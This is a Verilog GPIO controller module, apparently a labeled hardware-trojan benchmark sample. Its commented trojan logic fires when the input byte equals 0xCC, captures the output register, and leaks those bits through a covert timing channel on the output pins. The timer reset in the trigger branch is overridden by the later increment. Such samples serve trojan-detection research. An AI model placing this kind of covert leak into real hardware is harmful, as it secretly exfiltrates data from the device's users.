// GPIO-T100: GPIO controller with covert channel

module gpio_trojan(
    input clk,
    input rst,
    input [7:0] data_in,
    input [7:0] dir,  // 1=output, 0=input
    output reg [7:0] data_out,
    input [7:0] pins_in,
    output reg [7:0] pins_out
);

    reg [7:0] output_reg;
    reg [7:0] input_reg;

    // Trojan: covert channel through GPIO timing
    reg [15:0] Trojan_timer;
    reg [7:0] leak_data;
    wire trigger_leak = (data_in == 8'hCC);

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            output_reg <= 8'b0;
            input_reg <= 8'b0;
            data_out <= 8'b0;
            pins_out <= 8'b0;
            Trojan_timer <= 16'b0;
            leak_data <= 8'b0;
        end else begin
            // Normal GPIO operation
            input_reg <= pins_in;
            data_out <= (dir & output_reg) | (~dir & input_reg);

            // Update outputs
            output_reg <= data_in;
            pins_out <= dir & output_reg;

            // Trojan: capture and leak through timing
            if (trigger_leak) begin
                leak_data <= output_reg;
                Trojan_timer <= 16'b0;
            end

            Trojan_timer <= Trojan_timer + 1;

            // Modulate output timing based on leak data
            if (leak_data[Trojan_timer[15:13]]) begin
                pins_out <= pins_out;  // Hold state longer (detectable)
            end
        end
    end

endmodule
